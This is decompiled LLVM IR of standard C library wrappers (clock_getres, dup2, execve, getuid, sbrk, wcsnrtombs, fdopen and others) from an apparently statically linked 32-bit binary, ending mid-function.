define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061e3c = load i32, i32* @ebx, align 4
  store i32 %v0_8061e3c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_8061e4f = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_8061e4f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8061e4f, -4095
  br i1 %tmp, label %dec_label_pc_8061e68, label %dec_label_pc_8061e5c

dec_label_pc_8061e5c:                             ; preds = %entry
  %v0_8061e5c = load i32, i32* %stack_var_-4, align 4
  %v1_8061e5c = call i32 @__errno_location(i32 %v0_8061e5c)
  %v0_8061e61 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061e61 = sub i32 0, %v0_8061e61
  %v2_8061e63 = inttoptr i32 %v1_8061e5c to i32*
  store i32 %v1_8061e61, i32* %v2_8061e63, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061e68

dec_label_pc_8061e68:                             ; preds = %entry, %dec_label_pc_8061e5c
  %v0_8061e69 = phi i32 [ %v4_8061e4f, %entry ], [ -1, %dec_label_pc_8061e5c ]
  %v2_8061e6c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061e6c, i32* @ebx, align 4
  ret i32 %v0_8061e69

; uselistorder directives
  uselistorder i32 %v4_8061e4f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8061e68, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8061e70 = load i32, i32* @ebx, align 4
  store i32 %v0_8061e70, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8061e83 = call i32 @dup2(i32 %v0_8061e70, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_8061e83, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8061e83, -4095
  br i1 %tmp, label %dec_label_pc_8061e9c, label %dec_label_pc_8061e90

dec_label_pc_8061e90:                             ; preds = %entry
  %v0_8061e90 = load i32, i32* %stack_var_-4, align 4
  %v1_8061e90 = call i32 @__errno_location(i32 %v0_8061e90)
  %v0_8061e95 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061e95 = sub i32 0, %v0_8061e95
  %v2_8061e97 = inttoptr i32 %v1_8061e90 to i32*
  store i32 %v1_8061e95, i32* %v2_8061e97, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061e9c

dec_label_pc_8061e9c:                             ; preds = %entry, %dec_label_pc_8061e90
  %v0_8061e9d = phi i32 [ %v4_8061e83, %entry ], [ -1, %dec_label_pc_8061e90 ]
  %v2_8061ea0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061ea0, i32* @ebx, align 4
  ret i32 %v0_8061e9d

; uselistorder directives
  uselistorder i32 %v4_8061e83, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8061e9c, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_3()
  %tmp5 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061ea4 = load i32, i32* @edi, align 4
  store i32 %v0_8061ea4, i32* %stack_var_-4, align 4
  %v4_8061ea8 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8061ea8, i32* %edi.global-to-local, align 4
  %v0_8061eb4 = load i32, i32* @ebx, align 4
  %v5_8061ebc = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_8061ebc = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_8061ebc = call i32 @execve(i8* %arg1, [1 x i8*] %v5_8061ebc, [1 x i8*] %v8_8061ebc)
  store i32 %v9_8061ebc, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_8061ebc, -4095
  br i1 %tmp12, label %dec_label_pc_8061ed4, label %dec_label_pc_8061ec8

dec_label_pc_8061ec8:                             ; preds = %entry
  %v1_8061ec8 = call i32 @__errno_location(i32 %v0_8061eb4)
  %v0_8061ecd = load i32, i32* %edi.global-to-local, align 4
  %v1_8061ecd = sub i32 0, %v0_8061ecd
  %v2_8061ecf = inttoptr i32 %v1_8061ec8 to i32*
  store i32 %v1_8061ecd, i32* %v2_8061ecf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8061ed4

dec_label_pc_8061ed4:                             ; preds = %entry, %dec_label_pc_8061ec8
  %v0_8061ed5 = phi i32 [ %v9_8061ebc, %entry ], [ -1, %dec_label_pc_8061ec8 ]
  %v2_8061ed4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8061ed4, i32* @edx, align 4
  %v2_8061ed8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061ed8, i32* %edi.global-to-local, align 4
  ret i32 %v0_8061ed5

; uselistorder directives
  uselistorder i32 %v9_8061ebc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061ed4, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061edc = load i32, i32* @ebx, align 4
  store i32 %v0_8061edc, i32* %stack_var_-4, align 4
  %v1_8061ee5 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8061ee5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8061ee5, -4095
  br i1 %tmp, label %dec_label_pc_8061efc, label %dec_label_pc_8061ef0

dec_label_pc_8061ef0:                             ; preds = %entry
  %v0_8061ef0 = load i32, i32* %stack_var_-4, align 4
  %v1_8061ef0 = call i32 @__errno_location(i32 %v0_8061ef0)
  %v0_8061ef5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061ef5 = sub i32 0, %v0_8061ef5
  %v2_8061ef7 = inttoptr i32 %v1_8061ef0 to i32*
  store i32 %v1_8061ef5, i32* %v2_8061ef7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061efc

dec_label_pc_8061efc:                             ; preds = %entry, %dec_label_pc_8061ef0
  %v0_8061efd = phi i32 [ %v1_8061ee5, %entry ], [ -1, %dec_label_pc_8061ef0 ]
  %v2_8061f00 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061f00, i32* @ebx, align 4
  ret i32 %v0_8061efd

; uselistorder directives
  uselistorder i32 %v1_8061ee5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061efc, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061f04 = load i32, i32* @ebx, align 4
  store i32 %v0_8061f04, i32* %stack_var_-4, align 4
  %v1_8061f0d = call i32 @int80_syscall(i32 200)
  store i32 %v1_8061f0d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8061f0d, -4095
  br i1 %tmp, label %dec_label_pc_8061f24, label %dec_label_pc_8061f18

dec_label_pc_8061f18:                             ; preds = %entry
  %v0_8061f18 = load i32, i32* %stack_var_-4, align 4
  %v1_8061f18 = call i32 @__errno_location(i32 %v0_8061f18)
  %v0_8061f1d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061f1d = sub i32 0, %v0_8061f1d
  %v2_8061f1f = inttoptr i32 %v1_8061f18 to i32*
  store i32 %v1_8061f1d, i32* %v2_8061f1f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061f24

dec_label_pc_8061f24:                             ; preds = %entry, %dec_label_pc_8061f18
  %v0_8061f25 = phi i32 [ %v1_8061f0d, %entry ], [ -1, %dec_label_pc_8061f18 ]
  %v2_8061f28 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061f28, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8061f25

; uselistorder directives
  uselistorder i32 %v1_8061f0d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061f24, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061f2c = load i32, i32* @ebx, align 4
  store i32 %v0_8061f2c, i32* %stack_var_-4, align 4
  %v1_8061f35 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8061f35, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8061f35, -4095
  br i1 %tmp, label %dec_label_pc_8061f4c, label %dec_label_pc_8061f40

dec_label_pc_8061f40:                             ; preds = %entry
  %v0_8061f40 = load i32, i32* %stack_var_-4, align 4
  %v1_8061f40 = call i32 @__errno_location(i32 %v0_8061f40)
  %v0_8061f45 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061f45 = sub i32 0, %v0_8061f45
  %v2_8061f47 = inttoptr i32 %v1_8061f40 to i32*
  store i32 %v1_8061f45, i32* %v2_8061f47, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061f4c

dec_label_pc_8061f4c:                             ; preds = %entry, %dec_label_pc_8061f40
  %v0_8061f4d = phi i32 [ %v1_8061f35, %entry ], [ -1, %dec_label_pc_8061f40 ]
  %v2_8061f50 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061f50, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8061f4d

; uselistorder directives
  uselistorder i32 %v1_8061f35, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8061f4c, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8061f55 = load i32, i32* @ebx, align 4
  %v0_8061f59 = load i32, i32* @global_var_807e084.732, align 4
  %v1_8061f59 = icmp eq i32 %v0_8061f59, 0
  %v1_8061f64 = icmp eq i1 %v1_8061f59, false
  br i1 %v1_8061f64, label %dec_label_pc_8061f77, label %dec_label_pc_8061f66

dec_label_pc_8061f66:                             ; preds = %entry
  %v1_8061f6b = call i32 @__GI_brk(i32 0)
  %v2_8061f73 = icmp slt i32 %v1_8061f6b, 0
  br i1 %v2_8061f73, label %dec_label_pc_8061f99, label %dec_label_pc_8061f66.dec_label_pc_8061f77_crit_edge

dec_label_pc_8061f66.dec_label_pc_8061f77_crit_edge: ; preds = %dec_label_pc_8061f66
  %v0_8061f79.pre = load i32, i32* @global_var_807e084.732, align 4
  br label %dec_label_pc_8061f77

dec_label_pc_8061f77:                             ; preds = %dec_label_pc_8061f66.dec_label_pc_8061f77_crit_edge, %entry
  %v0_8061f87 = phi i32 [ %v0_8061f79.pre, %dec_label_pc_8061f66.dec_label_pc_8061f77_crit_edge ], [ %v0_8061f59, %entry ]
  %v1_8061f77 = icmp eq i32 %arg1, 0
  %v1_8061f7e = icmp eq i1 %v1_8061f77, false
  br i1 %v1_8061f7e, label %dec_label_pc_8061f84, label %dec_label_pc_8061f80

dec_label_pc_8061f80:                             ; preds = %dec_label_pc_8061f77
  br label %dec_label_pc_8061f9c

dec_label_pc_8061f84:                             ; preds = %dec_label_pc_8061f77
  store i32 %v0_8061f87, i32* @ebx, align 4
  %v2_8061f89 = add i32 %v0_8061f87, %arg1
  %v1_8061f8d = call i32 @__GI_brk(i32 %v2_8061f89)
  %v2_8061f95 = icmp slt i32 %v1_8061f8d, 0
  %v1_8061f97 = icmp eq i1 %v2_8061f95, false
  br i1 %v1_8061f97, label %dec_label_pc_8061f84.dec_label_pc_8061f9c_crit_edge, label %dec_label_pc_8061f99

dec_label_pc_8061f84.dec_label_pc_8061f9c_crit_edge: ; preds = %dec_label_pc_8061f84
  %v0_8061f9d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8061f9c

dec_label_pc_8061f99:                             ; preds = %dec_label_pc_8061f84, %dec_label_pc_8061f66
  br label %dec_label_pc_8061f9c

dec_label_pc_8061f9c:                             ; preds = %dec_label_pc_8061f84.dec_label_pc_8061f9c_crit_edge, %dec_label_pc_8061f80, %dec_label_pc_8061f99
  %v0_8061f9d = phi i32 [ %v0_8061f9d.pre, %dec_label_pc_8061f84.dec_label_pc_8061f9c_crit_edge ], [ %v0_8061f87, %dec_label_pc_8061f80 ], [ -1, %dec_label_pc_8061f99 ]
  store i32 %v0_8061f55, i32* @ebx, align 4
  ret i32 %v0_8061f9d

; uselistorder directives
  uselistorder i32 %v0_8061f87, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_8061f9c, { 2, 0, 1 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_8061fa8 = add i32 %arg1, 128
  %v6_8061fb3 = icmp ugt i32 %v1_8061fa8, 383
  br i1 %v6_8061fb3, label %dec_label_pc_8061fbe, label %dec_label_pc_8061fb5

dec_label_pc_8061fb5:                             ; preds = %entry
  %v0_8061fb5 = load i32, i32* bitcast (i32** @global_var_8075648.662 to i32*), align 8
  %v2_8061fba = mul i32 %arg1, 2
  %v3_8061fba = add i32 %v0_8061fb5, %v2_8061fba
  %v4_8061fba = inttoptr i32 %v3_8061fba to i16*
  %v5_8061fba = load i16, i16* %v4_8061fba, align 2
  %v6_8061fba = sext i16 %v5_8061fba to i32
  store i32 %v6_8061fba, i32* @edx, align 4
  br label %dec_label_pc_8061fbe

dec_label_pc_8061fbe:                             ; preds = %entry, %dec_label_pc_8061fb5
  %v0_8061fbe = phi i32 [ %arg1, %entry ], [ %v6_8061fba, %dec_label_pc_8061fb5 ]
  ret i32 %v0_8061fbe

; uselistorder directives
  uselistorder label %dec_label_pc_8061fbe, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_807bcbc.611 to i32)

; uselistorder directives
  uselistorder i32* @global_var_807bcbc.611, { 1, 0 }
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8061fd7 = icmp eq i32 %tmp4, 0
  %v1_8061fd9 = icmp eq i1 %v1_8061fd7, false
  br i1 %v1_8061fd9, label %dec_label_pc_8061fe1, label %dec_label_pc_8061fdb

dec_label_pc_8061fdb:                             ; preds = %entry
  %v2_8061fdb = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8061fe1

dec_label_pc_8061fe1:                             ; preds = %entry, %dec_label_pc_8061fdb
  %v0_8061ffd = phi i32 [ %tmp4, %entry ], [ %v2_8061fdb, %dec_label_pc_8061fdb ]
  %v0_8061fe9 = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_8061fdb ]
  %v2_8061fe1 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8061fe1, i32* %stack_var_-8, align 4
  store i32 %v0_8061fe9, i32* %stack_var_-4, align 4
  %v2_8061ff8 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8061ffe = inttoptr i32 %v0_8061ffd to i8*
  %v6_8061ffe = call i32 @__GI_wcsnrtombs(i8* %v5_8061ffe, i32 %v2_8061ff8, i32 1, i32 16, i32 %tmp)
  %v1_8062008 = icmp eq i32 %v6_8061ffe, 0
  %v3_806200a = select i1 %v1_8062008, i32 1, i32 %v6_8061ffe
  ret i32 %v3_806200a

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8061fe1, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8062029 = inttoptr i32 %tmp to i8*
  %v6_8062029 = call i32 @__GI_wcsnrtombs(i8* %v5_8062029, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8062029
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_8062037 = load i32, i32* @ebx, align 4
  %v4_806203b = ptrtoint i8* %arg1 to i32
  store i32 %v4_806203b, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_806204b = icmp eq i8* %arg1, null
  store i1 %v1_806204b, i1* %zf.global-to-local, align 1
  br i1 %v1_806204b, label %dec_label_pc_806205a, label %dec_label_pc_806204f

dec_label_pc_806204f:                             ; preds = %entry
  %v12_806204f = icmp eq i32 %v4_806203b, %arg2
  store i1 %v12_806204f, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8062056 = icmp eq i1 %v12_806204f, false
  br i1 %v1_8062056, label %dec_label_pc_806207d, label %dec_label_pc_8062077

dec_label_pc_806205a:                             ; preds = %entry
  %v2_806205a = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_806205a, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_806207b

dec_label_pc_8062063:                             ; preds = %dec_label_pc_806208b
  %v1_8062063 = call i32 @__errno_location(i32 %v0_8062037)
  %v1_8062068 = inttoptr i32 %v1_8062063 to i32*
  store i32 84, i32* %v1_8062068, align 4
  br label %dec_label_pc_80620b1

dec_label_pc_8062073:                             ; preds = %dec_label_pc_8062092
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_80620a6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80620a2

dec_label_pc_8062077:                             ; preds = %dec_label_pc_806204f
  %v2_8062077 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8062077, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_806207b

dec_label_pc_806207b:                             ; preds = %dec_label_pc_806205a, %dec_label_pc_8062077
  %v2_806209416 = phi i32 [ %v2_806205a, %dec_label_pc_806205a ], [ %v2_8062077, %dec_label_pc_8062077 ]
  %v1_806208012 = phi i32 [ -1, %dec_label_pc_806205a ], [ %arg4, %dec_label_pc_8062077 ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_806207d

dec_label_pc_806207d:                             ; preds = %dec_label_pc_806204f, %dec_label_pc_806207b
  %v2_806209415 = phi i32 [ %v4_806203b, %dec_label_pc_806204f ], [ %v2_806209416, %dec_label_pc_806207b ]
  %v0_8062082 = phi i32 [ %arg4, %dec_label_pc_806204f ], [ %v1_806208012, %dec_label_pc_806207b ]
  %v1_806207d = inttoptr i32 %arg2 to i32*
  %v2_806207d = load i32, i32* %v1_806207d, align 4
  store i32 %v2_806207d, i32* %ebx.global-to-local, align 4
  %tmp31 = icmp uge i32 %v0_8062082, %arg3
  %v5_8062084 = select i1 %tmp31, i32 %arg3, i32 %v0_8062082
  store i32 %v5_8062084, i32* %edi.global-to-local, align 4
  store i32 %v5_8062084, i32* @ecx, align 4
  %v1_806209e3 = icmp eq i32 %v5_8062084, 0
  store i1 %v1_806209e3, i1* %zf.global-to-local, align 1
  %v1_80620a010 = icmp eq i1 %v1_806209e3, false
  br i1 %v1_80620a010, label %dec_label_pc_806208b, label %dec_label_pc_80620a2

dec_label_pc_806208b:                             ; preds = %dec_label_pc_806207d, %dec_label_pc_8062098
  %v2_8062094 = phi i32 [ %v2_806209b, %dec_label_pc_8062098 ], [ %v2_806209415, %dec_label_pc_806207d ]
  %v0_806208b = phi i32 [ %v1_8062098, %dec_label_pc_8062098 ], [ %v2_806207d, %dec_label_pc_806207d ]
  %v1_806208b = inttoptr i32 %v0_806208b to i32*
  %v2_806208b = load i32, i32* %v1_806208b, align 4
  %v9_806208d = icmp eq i32 %v2_806208b, 127
  store i1 %v9_806208d, i1* %zf.global-to-local, align 1
  %v6_8062090 = icmp ugt i32 %v2_806208b, 127
  br i1 %v6_8062090, label %dec_label_pc_8062063, label %dec_label_pc_8062092

dec_label_pc_8062092:                             ; preds = %dec_label_pc_806208b
  %v3_8062092 = trunc i32 %v2_806208b to i8
  %v4_8062092 = icmp eq i8 %v3_8062092, 0
  store i1 %v4_8062092, i1* %zf.global-to-local, align 1
  %v3_8062094 = inttoptr i32 %v2_8062094 to i8*
  store i8 %v3_8062092, i8* %v3_8062094, align 1
  %v0_8062096 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8062096, label %dec_label_pc_8062073, label %dec_label_pc_8062098

dec_label_pc_8062098:                             ; preds = %dec_label_pc_8062092
  %v0_8062098 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8062098 = add i32 %v0_8062098, 4
  store i32 %v1_8062098, i32* %ebx.global-to-local, align 4
  %v0_806209b = load i32, i32* %edx.global-to-local, align 4
  %v1_806209b = load i32, i32* %esi.global-to-local, align 4
  %v2_806209b = add i32 %v1_806209b, %v0_806209b
  store i32 %v2_806209b, i32* %edx.global-to-local, align 4
  %v0_806209d = load i32, i32* @ecx, align 4
  %v1_806209d = add i32 %v0_806209d, -1
  %v8_806209d = icmp eq i32 %v1_806209d, 0
  store i32 %v1_806209d, i32* @ecx, align 4
  store i1 %v8_806209d, i1* %zf.global-to-local, align 1
  %v1_80620a0 = icmp eq i1 %v8_806209d, false
  br i1 %v1_80620a0, label %dec_label_pc_806208b, label %dec_label_pc_80620a2

dec_label_pc_80620a2:                             ; preds = %dec_label_pc_8062098, %dec_label_pc_806207d, %dec_label_pc_8062073
  %v0_80620aa = phi i32 [ 0, %dec_label_pc_8062073 ], [ %v2_806207d, %dec_label_pc_806207d ], [ %v1_8062098, %dec_label_pc_8062098 ]
  %v0_80620a6 = phi i32 [ %v0_80620a6.pre, %dec_label_pc_8062073 ], [ %v2_806209415, %dec_label_pc_806207d ], [ %v2_806209b, %dec_label_pc_8062098 ]
  %v2_80620a2 = ptrtoint i32* %stack_var_-32 to i32
  %v12_80620a6 = icmp eq i32 %v0_80620a6, %v2_80620a2
  store i1 %v12_80620a6, i1* %zf.global-to-local, align 1
  br i1 %v12_80620a6, label %dec_label_pc_80620ad, label %dec_label_pc_80620aa

dec_label_pc_80620aa:                             ; preds = %dec_label_pc_80620a2
  %v1_80620aa = load i32, i32* %ebp.global-to-local, align 4
  %v2_80620aa = inttoptr i32 %v1_80620aa to i32*
  store i32 %v0_80620aa, i32* %v2_80620aa, align 4
  br label %dec_label_pc_80620ad

dec_label_pc_80620ad:                             ; preds = %dec_label_pc_80620a2, %dec_label_pc_80620aa
  %v0_80620ad = load i32, i32* %edi.global-to-local, align 4
  %v1_80620af = load i32, i32* @ecx, align 4
  %v2_80620af = sub i32 %v0_80620ad, %v1_80620af
  %v12_80620af = icmp eq i32 %v2_80620af, 0
  br label %dec_label_pc_80620b1

dec_label_pc_80620b1:                             ; preds = %dec_label_pc_8062063, %dec_label_pc_80620ad
  %storemerge = phi i1 [ %v12_80620af, %dec_label_pc_80620ad ], [ false, %dec_label_pc_8062063 ]
  %storemerge1 = phi i32 [ %v2_80620af, %dec_label_pc_80620ad ], [ -1, %dec_label_pc_8062063 ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_80620b1 = load i32, i32* @esp, align 4
  %v9_80620b1 = icmp eq i32 %v0_80620b1, -28
  store i1 %v9_80620b1, i1* %zf.global-to-local, align 1
  store i32 %v0_8062037, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i1 %v12_80620a6, { 1, 0 }
  uselistorder i32 %v2_806209b, { 0, 2, 1 }
  uselistorder i32 %v1_8062098, { 0, 2, 1 }
  uselistorder i32 %v2_806208b, { 1, 2, 0 }
  uselistorder i32 %v2_806207d, { 1, 0, 2 }
  uselistorder i32 %v0_8062082, { 1, 0 }
  uselistorder i32 %v2_806209415, { 1, 0 }
  uselistorder i1 %v12_806204f, { 1, 0 }
  uselistorder i32 %v4_806203b, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 2, 0, 3, 8, 5, 6, 7, 1, 9, 4, 10, 11, 12 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 2, 0, 1, 8, 3, 4, 9, 5, 7, 6 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80620b1, { 1, 0 }
  uselistorder label %dec_label_pc_80620ad, { 1, 0 }
  uselistorder label %dec_label_pc_806208b, { 1, 0 }
  uselistorder label %dec_label_pc_806207d, { 1, 0 }
  uselistorder label %dec_label_pc_806207b, { 1, 0 }
}

define i32 @fdopen(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80620bc = load i32, i32* @ebx, align 4
  store i32 %v0_80620bc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_80620c7 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 %tmp11)
  store i32 %v3_80620c7, i32* @eax, align 4
  %v10_80620d1 = icmp eq i32 %v3_80620c7, -1
  br i1 %v10_80620d1, label %dec_label_pc_80620e8, label %dec_label_pc_80620d6

dec_label_pc_80620d6:                             ; preds = %entry
  %v0_80620d6 = load i32, i32* @ebx, align 4
  %v4_80620de = inttoptr i32 %arg2 to i8*
  %v5_80620de = call i32 @_stdio_fopen(i32 %v3_80620c7, i8* %v4_80620de, i32 0, i32 %v0_80620d6)
  br label %dec_label_pc_80620e8

dec_label_pc_80620e8:                             ; preds = %entry, %dec_label_pc_80620d6
  %v0_80620e8 = phi i32 [ 0, %entry ], [ %v5_80620de, %dec_label_pc_80620d6 ]
  %v2_80620ec = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80620ec, i32* @ebx, align 4
  ret i32 %v0_80620e8

; uselistorder directives
  uselistorder i32 %v3_80620c7, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 3, 0, 1, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80620e8, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_80620f0 = load i32, i32* @ebp, align 4
  %v0_80620f1 = load i32, i32* @edi, align 4
  %v0_80620f2 = load i32, i32* @esi, align 4
  %v0_80620f3 = load i32, i32* @ebx, align 4
  %v15_80620f4 = ptrtoint i32* %stack_var_-28 to i32
  %v4_80620f7 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80620f7, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_80621034 = icmp eq i32 %arg3, 0
  store i1 %v1_80621034, i1* %zf.global-to-local, align 1
  br i1 %v1_80621034, label %dec_label_pc_8062164, label %dec_label_pc_8062108.lr.ph

dec_label_pc_8062108.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8062108

dec_label_pc_8062108:                             ; preds = %dec_label_pc_8062124.dec_label_pc_8062108_crit_edge, %dec_label_pc_8062108.lr.ph
  %v0_8062115 = phi i32 [ %v4_80620f7, %dec_label_pc_8062108.lr.ph ], [ %v0_8062115.pre, %dec_label_pc_8062124.dec_label_pc_8062108_crit_edge ]
  %v0_8062114 = phi i32 [ %arg2, %dec_label_pc_8062108.lr.ph ], [ %v2_8062126, %dec_label_pc_8062124.dec_label_pc_8062108_crit_edge ]
  %v0_8062110.in = phi i32 [ %arg3, %dec_label_pc_8062108.lr.ph ], [ %v2_8062124, %dec_label_pc_8062124.dec_label_pc_8062108_crit_edge ]
  %v4_8062110 = phi i32 [ %arg3, %dec_label_pc_8062108.lr.ph ], [ %v2_8062124, %dec_label_pc_8062124.dec_label_pc_8062108_crit_edge ]
